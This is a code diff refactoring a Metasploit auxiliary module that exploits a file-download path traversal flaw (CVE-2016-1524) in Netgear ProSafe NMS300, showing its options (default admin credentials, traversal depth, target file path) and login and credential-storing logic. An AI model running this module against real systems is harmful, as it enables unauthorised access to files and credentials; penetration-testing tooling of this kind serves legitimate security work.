@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -16,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => %q{
         Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.
         The application has a file download vulnerability that can be exploited by an
-        authenticated remote attacker to download any file in the system..
+        authenticated remote attacker to download any file in the system.
         This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.
       },
       'Author' =>
@@ -29,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2016-1524'],
           ['US-CERT-VU', '777024'],
           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt'],
-          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/30']
+          ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/30']
         ],
       'DisclosureDate' => 'Feb 4 2016'))
 
@@ -40,12 +37,12 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to login as', 'admin']),
         OptString.new('PASSWORD', [true, 'Password for the specified username', 'admin']),
         OptString.new('FILEPATH', [false, 'Path of the file to download minus the drive letter', '/Windows/System32/calc.exe']),
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptInt.new('DEPTH', [false, 'Max depth to traverse', 15])
-      ], self.class)
+      ])
   end
 
   def authenticate
@@ -151,45 +148,13 @@ class MetasploitModule < Msf::Auxiliary
     print_good("File saved in: #{path}")
   end
 
-  def report_cred(opts)
-    service_data = {
-      address: rhost,
-      port: rport,
-      service_name: 'netgear',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
-
-    login_data = {
-      last_attempted_at: DateTime.now,
-      core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::SUCCESSFUL,
-      proof: opts[:proof]
-    }.merge(service_data)
-
-    create_credential_login(login_data)
-  end
-
-
   def run
     cookie = authenticate
     if cookie == nil
       fail_with(Failure::Unknown, "#{peer} - Failed to log in with the provided credentials.")
     else
       print_good("#{peer} - Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.")
-      report_cred(
-        user: datastore['USERNAME'],
-        password: datastore['PASSWORD'],
-        proof: cookie
-      )
+      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie) # more consistent service_name and protocol
     end
 
     if datastore['FILEPATH'].blank?
